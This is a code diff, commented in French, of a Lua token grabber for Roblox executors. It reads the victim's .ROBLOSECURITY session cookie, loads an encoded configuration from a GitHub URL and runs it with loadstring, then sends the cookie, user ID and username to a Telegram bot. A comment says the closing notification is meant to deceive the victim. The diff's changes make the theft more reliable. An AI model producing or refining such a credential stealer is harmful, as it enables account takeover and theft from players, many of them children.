@@ -1,47 +1,42 @@
--- Script pour récupérer le cookie Roblox et l'envoyer à Telegram
+-- Script modifié pour récupérer le cookie Roblox et l'envoyer à Telegram
 -- Fonctionne avec les exécuteurs comme Delta, Synapse X, etc.
 
--- Services Roblox nécessaires
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- ⚠️ Ne stocke PAS tes informations Telegram ici ⚠️
--- Elles seront récupérées à partir du serveur séparé
-
 -- Fonction pour obtenir le cookie .ROBLOSECURITY
 local function getCookie()
-    -- Cette méthode varie selon l'exécuteur
-    -- Pour Delta, utilise cette méthode :
     local cookie = ""
     
     if syn then
-        cookie = syn.request({
-            Url = "https://roblox.com",
-            Method = "GET"
-        }).Cookies[".ROBLOSECURITY"]
+        local response = syn.request({ Url = "https://www.roblox.com", Method = "GET" })
+        if response and response.Cookies then
+            cookie = response.Cookies[".ROBLOSECURITY"] or "Cookie non trouvé"
+        end
     elseif http and http.request then
-        cookie = http.request({
-            Url = "https://roblox.com",
-            Method = "GET"
-        }).Cookies[".ROBLOSECURITY"]
+        local response = http.request({ Url = "https://www.roblox.com", Method = "GET" })
+        if response and response.Cookies then
+            cookie = response.Cookies[".ROBLOSECURITY"] or "Cookie non trouvé"
+        end
     elseif request then
-        cookie = request({
-            Url = "https://roblox.com",
-            Method = "GET"
-        }).Cookies[".ROBLOSECURITY"]
+        local response = request({ Url = "https://www.roblox.com", Method = "GET" })
+        if response and response.Cookies then
+            cookie = response.Cookies[".ROBLOSECURITY"] or "Cookie non trouvé"
+        end
+    else
+        cookie = "Exécuteur non supporté"
     end
     
-    return cookie or "Cookie non trouvé"
+    print("Cookie récupéré : " .. tostring(cookie))  -- Debug log
+    return cookie
 end
 
--- Fonction pour envoyer à Telegram (les infos sont chargées dynamiquement)
+-- Fonction pour envoyer à Telegram
 local function sendToTelegram(token, userId, userName)
-    -- Récupérer la configuration à partir du fichier séparé
     local configUrl = "https://raw.githubusercontent.com/TON_USERNAME/roblox-token-grabber/main/config_encoded.lua"
     local configEncoded = game:HttpGet(configUrl)
     
-    -- Décoder la configuration (simple encodage base64)
     local function decode(str)
         local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
         return (str:gsub('[^'..b..'=]', ''):gsub('.', function(x)
@@ -57,12 +52,17 @@ local function sendToTelegram(token, userId, userName)
         end))
     end
     
-    local config = loadstring(decode(configEncoded))()
-    local TELEGRAM_BOT_TOKEN = config.t
-    local CHAT_ID = config.c
+    local decodedConfig
+    pcall(function() decodedConfig = loadstring(decode(configEncoded))() end)  -- Error handling pour le décodage
+    if not decodedConfig then
+        warn("Échec du décodage de la config")
+        return
+    end
+    
+    local TELEGRAM_BOT_TOKEN = decodedConfig.t or "Token manquant"
+    local CHAT_ID = decodedConfig.c or "Chat ID manquant"
     local TELEGRAM_API_URL = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
     
-    -- Envoyer le message à Telegram
     local success, response = pcall(function()
         local data = {
             chat_id = CHAT_ID,
@@ -81,19 +81,28 @@ local function sendToTelegram(token, userId, userName)
         
         local headers = { ["Content-Type"] = "application/json" }
         local jsonData = HttpService:JSONEncode(data)
-        return HttpService:PostAsync(TELEGRAM_API_URL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
+        return HttpService:RequestAsync({  -- Utilise RequestAsync pour plus de fiabilité
+            Url = TELEGRAM_API_URL,
+            Method = "POST",
+            Headers = headers,
+            Body = jsonData
+        })
     end)
     
     if success then
         print("Token envoyé avec succès!")
     else
-        warn("Échec: " .. tostring(response))
+        warn("Échec de l'envoi à Telegram: " .. tostring(response))
     end
 end
 
 -- Exécution principale
 local cookie = getCookie()
-sendToTelegram(cookie, player.UserId, player.Name)
+if cookie ~= "Cookie non trouvé" and cookie ~= "Exécuteur non supporté" then
+    sendToTelegram(cookie, player.UserId, player.Name)
+else
+    warn("Cookie non récupéré, envoi annulé")
+end
 
 -- Afficher un message de succès pour tromper la victime
 game:GetService("StarterGui"):SetCore("SendNotification", {
